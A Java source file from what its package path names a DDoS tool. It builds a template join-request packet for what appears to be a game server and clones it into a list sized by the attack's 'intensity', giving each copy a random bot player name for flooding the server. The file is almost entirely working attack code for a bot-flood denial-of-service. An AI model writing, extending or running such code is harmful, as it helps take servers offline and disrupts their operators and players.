package src.Main.DDosSoftware.DDosLogic.Client;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

import org.apache.commons.lang3.RandomStringUtils;

import src.Main.DDosSoftware.DDosLogic.Flood.DDoSManager;
import src.Main.DDosSoftware.EntryPoint.GUI;

public class ClientPacketManager {

    // ASCII Table:
    // https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/ASCII-Table-wide.svg/2560px-ASCII-Table-wide.svg.png

    /*
     * <p>From element 20 (116) to end (105) is the player's name</p>
     */
    public static byte[] joinRequestPacketSample = {
            16, 0, -10, 5, 9, 108, 111, 99, 97, 108, 104, 111, 115, 116, 19, -120, 2, 17, 0, 15,
            116, 104, 97, 110, 103, 114, 97, 116, 100, 101, 112, 116, 114, 97, 104, 105 };

    public static List<byte[]> packetList = new ArrayList<>();

    /**
     * Packet amount is depended on the DDoS's intensity
     */
    public static void generateRandomPacket() {
        System.out.println("Generating packets...");
        for (int packet = 0; packet < DDoSManager.getBotSize(GUI.DDoS.getIntensity()); packet++) {
            packetList.add(defaultByte());
        }

        for (int x = 0; x < packetList.size(); x++) {
            byte[] randName = RandomStringUtils.randomAlphanumeric(16).getBytes();
            for (int index = 20; index < joinRequestPacketSample.length; index++) {
                packetList.get(x)[index] = randName[index - 20];
            }
            System.out.println(new String(randName, StandardCharsets.UTF_8));
        }
        System.out.println("All the packets are generated!");
        try {
            Thread.sleep(1000);
        } catch (Exception e) {

        }
    }

    private static byte[] defaultByte() {
        byte[] b = {
                16, 0, -10, 5, 9, 108, 111, 99, 97, 108, 104, 111, 115, 116, 19, -120, 2, 17, 0, 15,
                0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
        return b;
    }

}
